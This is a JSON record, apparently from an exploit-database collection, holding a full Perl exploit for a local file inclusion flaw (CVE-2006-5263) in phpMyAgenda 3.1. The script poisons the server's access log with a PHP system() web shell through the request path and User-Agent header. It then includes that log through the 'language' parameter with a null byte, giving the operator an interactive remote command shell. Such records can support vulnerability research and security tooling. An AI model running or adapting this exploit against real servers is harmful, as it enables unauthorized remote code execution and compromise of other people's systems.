{
  "id": "2500",
  "title": "phpMyAgenda 3.1 - &#039;/templates/header.php3&#039; Local File Inclusion",
  "cve": "CVE-2006-5263",
  "vuln_type": "path_traversal",
  "code": "#!/usr/bin/perl\r\n\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n\r\nprint \"\\n\";\r\nprint \"#################################################################\\n\";\r\nprint \"#                                                               #\\n\";\r\nprint \"# phpMyAgenda < 3.1 Multiple Remote Vulnerabilities Exploit     #\\n\";\r\nprint \"# Bug found By : Ashiyane Corporation                           #\\n\";\r\nprint \"# Email: Nima Salehi    nima[at]ashiyane.ir                     #\\n\";\r\nprint \"# Web Site : www.Ashiyane.ir                                    #\\n\";\r\nprint \"#                                                               #\\n\";\r\nprint \"#################################################################\\n\";\r\n\r\n\r\nif (@ARGV < 3)\r\n{\r\n    print \"\\n Usage: Ashiyane.pl [host] [path] [access.log path]\";\r\n    print \"\\n EX : Ashiyane.pl www.victim.com /phpMyAgenda/ ../../../logs/access.log \\n\\n\";\r\nexit;\r\n}\r\n\r\n\r\n$host=$ARGV[0];\r\n$path=$ARGV[1];\r\n$accpath=$ARGV[2];\r\n\r\n\r\nprint \"Injecting some code in log files...\\n\";\r\n\r\n$CODE=\"<?php ob_clean();system(\\$HTTP_COOKIE_VARS[cmd]);die;?>\";\r\n$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\", PeerPort=>\"80\") or die \" Could not connect to host.\\n\\n\";\r\nprint $socket \"GET \".$path.$CODE.\" HTTP/1.1\\r\\n\";\r\nprint $socket \"User-Agent: \".$CODE.\"\\r\\n\";\r\nprint $socket \"Host: \".$host.\"\\r\\n\";\r\nprint $socket \"Connection: close\\r\\n\\r\\n\";\r\nclose($socket);\r\n\r\n\r\nprint \"Type Your Commands ( uname -a )\\n\";\r\nprint \"For Exiit Type END\\n\";\r\nprint \"IF not working try another access.log path\\n\\n\";\r\n\r\nprint \"[shell] \";$cmd = <STDIN>;\r\n\r\nwhile($cmd !~ \"END\") {\r\n    $socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\", PeerPort=>\"80\") or die \"Could not connect to host.\\n\\n\";\r\n\r\n    print $socket \"GET \".$path.\"templates/header.php3?language=\".$accpath.\"%00&cmd=$cmd HTTP/1.1\\r\\n\";\r\n    print $socket \"Host: \".$host.\"\\r\\n\";\r\n    print $socket \"Accept: */*\\r\\n\";\r\n    print $socket \"Connection: close\\r\\n\\n\";\r\n\r\n    while ($raspuns = <$socket>)\r\n    {\r\n        print $raspuns;\r\n    }\r\n\r\n    print \"[shell] \";\r\n    $cmd = <STDIN>;\r\n}\r\n\r\n# milw0rm.com [2006-10-10]",
  "url": "https://www.exploit-db.com/exploits/2500"
}